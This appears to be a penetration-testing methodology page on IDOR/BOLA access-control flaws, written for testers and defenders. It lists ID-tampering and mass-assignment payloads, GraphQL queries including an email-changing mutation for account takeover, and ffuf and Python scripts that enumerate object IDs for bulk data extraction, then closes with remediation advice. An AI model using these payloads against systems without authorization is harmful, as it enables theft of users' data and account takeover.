---
title: "IDOR / BOLA: Insecure Direct Object Reference"
date: 2026-02-24
draft: false
---

# IDOR / BOLA: Insecure Direct Object Reference

> **Severity**: High–Critical | **CWE**: CWE-639
> **OWASP**: A01:2021 – Broken Access Control
> **API Security**: OWASP API Top 10 — API1:2023 BOLA

---

## What Is IDOR / BOLA?

**IDOR** (Insecure Direct Object Reference) occurs when an application uses a user-controllable identifier (ID, filename, hash) to access a resource without verifying that the requesting user is authorized to access it.

**BOLA** (Broken Object Level Authorization) is the API-centric term — same concept, different vocabulary. It is the #1 API vulnerability class.

The impact ranges from unauthorized data read (horizontal privilege escalation) to unauthorized modification and deletion (vertical privilege escalation), account takeover, and mass data exfiltration.

```
Horizontal: user A reads user B's data (same privilege level)
Vertical:   standard user reads/modifies admin-only resources
```

---

## Attack Surface Map

```
# Numeric sequential IDs (most obvious):
GET /api/users/1337        → change to 1338
GET /invoice/10042         → change to 10041, 10043
GET /orders?order_id=5001

# UUIDs / GUIDs (common false sense of security):
GET /api/documents/550e8400-e29b-41d4-a716-446655440000
# UUIDs are not authorization — just obscurity. Still test.

# Filenames / paths:
GET /download?file=invoice_10042.pdf
GET /export?name=report_2024_Q1.csv

# Hashes (MD5 of email, predictable hashes):
GET /user/5f4dcc3b5aa765d61d8327deb882cf99   ← MD5('password')
GET /account/d41d8cd98f00b204e9800998ecf8427e ← MD5('')

# Encoded IDs:
GET /resource/dXNlcl9pZD0xMjM=   ← base64: "user_id=123"
GET /item/MTAwNA==                 ← base64: "1004"

# Parameters in POST body / JSON:
POST /api/update {"user_id": 5001, "email": "..."}
PUT /account {"account_id": "ACC-0042", "data": {...}}

# Indirect references — pivot fields:
GET /messages?thread=THREAD_ID
GET /profile?username=john  ← username is a reference
GET /share?token=SHARING_TOKEN

# GraphQL:
{ user(id: "1337") { email privateData } }
{ order(id: 5001) { total items } }

# Hidden parameters:
?debug=true&user=admin
?_user_id=1337  (hidden field in form)

# Second-order IDOR:
Store ID in step 1 → used in step 2 to fetch data
```

---

## Discovery Checklist

### Phase 1 — Map All References

- [ ] Intercept all requests — log every ID, reference, token in URL/body/cookie
- [ ] Identify all endpoints that return user-specific data
- [ ] Map which parameters correlate with data ownership
- [ ] Note ID format: numeric, UUID, hash, encoded, sequential
- [ ] Check hidden form fields and non-obvious parameters
- [ ] Check GraphQL: every object with an `id` argument
- [ ] Check websocket messages for object references
- [ ] Review JS source for undocumented API endpoints with IDs

### Phase 2 — Horizontal Testing (Same Role)

- [ ] Create 2 accounts (AccountA, AccountB)
- [ ] Perform actions with AccountA — capture all object IDs
- [ ] With AccountB's session, attempt to access AccountA's IDs
- [ ] Test: GET, PUT, PATCH, DELETE, POST on each identified resource
- [ ] Test access to all objects, not just the latest one (try lower IDs)
- [ ] Test indirect references (filenames, usernames, emails)

### Phase 3 — Vertical Testing (Privilege Escalation)

- [ ] Enumerate admin-only endpoint IDs from error messages / JS source
- [ ] Access admin objects with standard user session
- [ ] Attempt to assign admin roles: `{"role": "admin", "user_id": YOUR_ID}`
- [ ] Test mass assignment: send extra fields in PUT/PATCH requests
- [ ] Try accessing other users' password reset tokens

### Phase 4 — Enumerate & Escalate

- [ ] If sequential: use Burp Intruder to iterate IDs from 1 to N
- [ ] If encoded: decode → increment → re-encode
- [ ] If UUID: check if UUIDs are v1 (time-based, predictable) or v4 (random)
- [ ] If hash: check if it's a hash of a predictable value (email, username)
- [ ] Attempt mass exfiltration: loop through ID range, log all responses

---

## Payload Library

### Section 1 — Numeric ID Manipulation

```bash
# Direct iteration — Burp Intruder (Sniper mode):
GET /api/users/§1§ HTTP/1.1

# Ranges:
1, 2, 3, 4, 5 ... 9999
1000 to 2000
-1, 0         ← negative/zero sometimes returns admin/system objects
99999999      ← high value — admin or system account

# Off-by-one:
YOUR_ID - 1
YOUR_ID + 1

# Parameter pollution (send both IDs):
GET /api/invoice/1001&id=1002
POST body: {"id": 1001, "id": 1002}   ← some parsers take last

# Array injection:
GET /api/invoice/[1001,1002,1003]
POST {"ids": [1001, 1002, 1003]}

# Type juggling (PHP/JS loose comparison):
id=0           ← may match first record
id=0e0         ← scientific notation
id=true        ← boolean coercion
id=null
id=undefined
```

### Section 2 — Encoded ID Manipulation

```bash
# Base64 encoded IDs:
echo -n "user_id=123" | base64   → dXNlcl9pZD0xMjM=
echo -n "user_id=124" | base64   → dXNlcl9pZD0xMjQ=

# Common base64 patterns:
echo "1337" | base64             → MTMzNw==
echo "1338" | base64             → MTMzOA==
echo "1003" | base64             → MTAwMw==
echo "1004" | base64             → MTAwNA==

# Decode + modify + re-encode in Burp:
# Proxy → Decoder tab → Decode as Base64 → modify → Encode as Base64

# JWT with user ID in payload:
# Decode: echo "eyJ1c2VySWQiOiIxMjMifQ" | base64 -d
# → {"userId":"123"}
# Modify: {"userId":"124"} → base64 → swap into JWT (and handle signature)

# Hex-encoded IDs:
0x41 = 65 decimal
0x400 = 1024

# URL-encoded components:
%31%33%33%37 → 1337
```

### Section 3 — UUID Attacks

```
# UUIDs are NOT authorization — just long IDs. Test anyway.

# v1 UUID (time-based — predictable):
# Format: xxxxxxxx-xxxx-1xxx-yxxx-xxxxxxxxxxxx
# The timestamp is encoded in the first three groups
# Tool: uuid-tool, uuid_hack

# Predict v1 UUIDs:
pip install uuid-utils
python3 -c "
import uuid, time
# If you know approximate time of account creation:
# Generate UUIDs around that time
ts = int(time.time() * 1e7) + 0x01b21dd213814000
for i in range(-100, 100):
    u = uuid.UUID(int=(ts+i) | (0x1 << 76) | (0x8 << 60) | 0x3fffffffffff)
    print(u)
"

# v4 UUID (random) — test but expect no pattern
# If UUIDs are returned in API responses, collect them:
# GET /api/users → returns list of user UUIDs → access each

# GUID in URL path — try GUID of admin/system accounts:
# Often found in: error messages, email links, JS source
```

### Section 4 — Hash-Based ID Attacks

```bash
# If ID looks like MD5 (32 hex chars):
python3 -c "import hashlib; print(hashlib.md5(b'user@company.com').hexdigest())"
python3 -c "import hashlib; print(hashlib.md5(b'admin').hexdigest())"
python3 -c "import hashlib; print(hashlib.md5(b'1337').hexdigest())"

# Common hash inputs to try:
# - Email address
# - Username
# - Numeric ID as string: "1", "2", "100"
# - Email + sequential: email+"1", email+"2"

# SHA1 (40 hex chars):
python3 -c "import hashlib; print(hashlib.sha1(b'user@company.com').hexdigest())"

# SHA256 (64 hex chars):
python3 -c "import hashlib; print(hashlib.sha256(b'user@company.com').hexdigest())"

# If it's HMAC: find the secret key (check JS source, error messages, /debug)
```

### Section 5 — Parameter Location Bypass

```
# Change WHERE the ID is passed:
GET /api/user?id=1337        → try /api/user/1337
GET /api/user/1337           → try /api/user?id=1337
POST body: {"id": 1337}      → try as URL param: ?id=1337
Header injection: X-User-ID: 1337

# HTTP method switch:
GET /api/invoice/1001        → try DELETE /api/invoice/1001
GET /api/invoice/1001        → try PUT /api/invoice/1001 {"amount":0}

# Version switch — different auth logic:
/api/v1/users/1337           → try /api/v2/users/1337
/api/v2/users/1337           → try /api/v1/users/1337 (older, less auth)
/api/users/1337              → try /api/v0/users/1337 or /api/internal/users/1337

# Endpoint suffix:
GET /api/users/1337.json
GET /api/users/1337.xml
GET /api/users/1337/export
GET /api/users/1337/data
```

### Section 6 — Mass Assignment (IDOR Variant)

Mass assignment occurs when user-controlled fields are directly mapped to model attributes.

```bash
# Add unexpected fields in PUT/PATCH/POST:
PUT /api/users/profile
Original: {"name": "John", "email": "john@x.com"}
Modified: {"name": "John", "email": "john@x.com", "role": "admin", "is_admin": true, "plan": "enterprise"}

# Common mass-assignable fields:
role, is_admin, admin, privilege, permission, plan, subscription,
balance, credits, discount, verified, confirmed, active, locked,
user_id, account_id, group_id, team_id, org_id

# Try as nested:
{"user": {"name": "John", "role": "admin"}}

# Try via query param:
PUT /api/profile?role=admin

# In registration:
POST /api/register
{"username":"x","password":"x","email":"x@x.com","role":"admin","is_admin":true}
```

### Section 7 — GraphQL IDOR

```graphql
# Direct object access:
{ user(id: "1337") { email phone address } }
{ order(id: 5001) { total paymentMethod items { price } } }
{ document(id: "DOC-001") { content owner } }

# Introspection to find all queryable types with IDs:
{ __schema { queryType { fields { name args { name type { name } } } } } }

# Mutation-based IDOR:
mutation {
  updateUser(id: "1337", input: {email: "attacker@x.com"}) { success }
}
mutation {
  deletePost(id: "5001") { success }
}

# Batch IDOR (no rate limit on IDs):
[
  {"query": "{ user(id: \"1\") { email } }"},
  {"query": "{ user(id: \"2\") { email } }"},
  {"query": "{ user(id: \"3\") { email } }"}
]

# Alias enumeration:
{
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
}
```

---

## Automation

```bash
# Burp Intruder — numeric ID bruteforce:
# 1. Capture: GET /api/users/§1337§ → send to Intruder
# 2. Payload: Numbers, 1 to 10000, step 1
# 3. Grep: response size / specific field names
# 4. Sort by response length → different lengths = different data

# ffuf — IDOR fuzzing:
ffuf -u "https://target.com/api/users/FUZZ" \
     -w <(seq 1 10000) \
     -fc 404,403 \
     -od ./idor_results/ \
     -of json

# Autorize (Burp extension) — automated horizontal IDOR:
# 1. Login as User A → copy session cookie
# 2. Login as User B → enable Autorize, paste User A's cookie
# 3. Browse as User B → Autorize replays every request with User A's cookie
# 4. Red = accessible (IDOR confirmed), Green = blocked

# AuthMatrix (Burp extension) — multi-user authorization matrix:
# Tests all HTTP methods × all users × all endpoints simultaneously

# IDOR detection script (Python):
import requests

session_a = "SESSION_COOKIE_USER_A"
session_b = "SESSION_COOKIE_USER_B"

for obj_id in range(1000, 2000):
    r = requests.get(
        f"https://target.com/api/invoice/{obj_id}",
        cookies={"session": session_b}
    )
    if r.status_code == 200:
        print(f"[IDOR] ID {obj_id} accessible: {r.text[:100]}")
```

---

## Remediation Reference

- **Server-side authorization check on every request**: verify that `current_user.id == resource.owner_id` before returning or modifying any object
- **Indirect object references**: map internal IDs to per-user tokens (`session_id → [resource_id_1, resource_id_2]`) — never expose raw DB IDs
- **Deny by default**: if authorization is not explicitly granted, deny access
- **Mass assignment**: explicitly whitelist allowed fields at the model layer — never use `update_attributes(params)` without filtering
- **Log access patterns**: detect sequential ID enumeration via anomaly detection

*Part of the Web Application Penetration Testing Methodology series.*
